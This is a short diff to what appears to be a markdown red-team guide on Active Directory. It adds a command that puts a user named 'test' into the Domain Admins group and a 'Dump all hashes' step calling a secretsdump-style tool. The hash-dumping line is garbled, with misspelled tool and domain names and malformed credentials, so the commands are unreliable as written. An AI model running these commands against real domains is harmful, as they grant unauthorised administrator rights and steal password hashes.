@@ -470,9 +470,18 @@ test – The username of the new account.
 /domain – Performs the action on the Active Directory domain instead of the local machine.
 ```
 
+**Output:**
 
+## Add a User to the Domain Admins Group
 
+The following command attempts to add the user `test` to the `Domain Admins` group:
 
+```bash
+net group "Domain Admins" test /ADD /DOMAIN
+```
+ Dump all hashes:
+
+ secretdump.py readteambd.local/testuser:@terstuser#!
 
 
 
